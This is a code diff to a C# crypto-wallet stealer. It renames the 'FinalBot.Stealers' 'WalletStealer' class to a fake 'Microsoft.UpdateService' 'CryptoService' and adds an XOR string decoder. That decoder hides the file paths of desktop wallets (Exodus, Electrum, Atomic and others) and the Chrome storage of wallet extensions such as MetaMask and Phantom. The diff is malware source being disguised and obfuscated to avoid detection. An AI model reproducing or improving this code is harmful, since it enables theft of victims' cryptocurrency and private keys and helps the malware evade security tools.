@@ -4,30 +4,37 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Threading.Tasks;
 
-namespace FinalBot.Stealers
+namespace Microsoft.UpdateService.Modules
 {
-    public class WalletStealer
+    public class CryptoService
     {
+        private static string D(string s)
+        {
+            char[] c = s.ToCharArray();
+            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
+            return new string(c);
+        }
+
         private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
 
         private readonly Dictionary<string, string> _walletPaths = new Dictionary<string, string>
         {
-            {"Exodus", "Exodus\\exodus.wallet"},
-            {"Electrum", "Electrum\\wallets"},
-            {"Coinomi", "Coinomi\\Coinomi\\wallets"},
-            {"Atomic", "atomic\\Local Storage\\leveldb"},
-            {"Guarda", "Guarda\\Local Storage\\leveldb"},
-            {"Jaxx", "com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"}
+            {"Exodus", D("@}japvYY`}japv+rdii`q")},
+            {"Electrum", D("@i`fqwphYYrdii`qv")},
+            {"Coinomi", D("FjlkjhlYYFjlkjhlYYrdii`qv")},
+            {"Atomic", D("dqjhlfYYIjfdi%Vqjwdb`YYi`s`iag")},
+            {"Guarda", D("BpdwadYYIjfdi%Vqjwdb`YYi`s`iag")},
+            {"Jaxx", D("fjh+ilg`wq|+od}}YYLka`}`aAGYYcli`ZZ5+lka`}`aag+i`s`iag")}
         };
 
         private readonly Dictionary<string, string> _extensionPaths = new Dictionary<string, string>
         {
-            {"Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
-            {"Phantom", "bfnaoomekhehdbephnjmmcptobbiogee"},
-            {"Binance", "fhbohhlidocbacedohohjccennooocaa"},
-            {"Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnoad"},
-            {"Trust Wallet", "egjidjbpgmcnihkmyhgneha bidpmoad"}
+            {"Metamask", D("knglmcg`jbd`dj`mi`cknjag`cbubnkk")},
+            {"Phantom", D("gckdjjh`nm`mag`umkohhfuqjggljb``")},
+            {"Binance", D("cmgjmmilajfgdf`ajmjmoff`kkjjjfdd")},
+            {"Coinbase", D("mkcdknkjfc`jcgaabflokhmkcknakjda")},
+            {"Trust Wallet", D("`bolaogubhfklmnh|mbk`md%glauhjda")}
         };
 
         public async Task<string> Run(string outputDir)
@@ -58,7 +65,7 @@ namespace FinalBot.Stealers
             }
 
             // 2. Browser Extensions (Chrome Example)
-            string chromeExtPath = Path.Combine(_localAppData, "Google\\Chrome\\User Data\\Default\\Local Extension Settings");
+            string chromeExtPath = Path.Combine(_localAppData, D("Bjjbi`YFmwjh`YPv`w%AdqdYA`idpiqYIjfdi%@}q`kvljk%V`qqmkgv"));
             if (Directory.Exists(chromeExtPath))
             {
                 foreach (var ext in _extensionPaths)
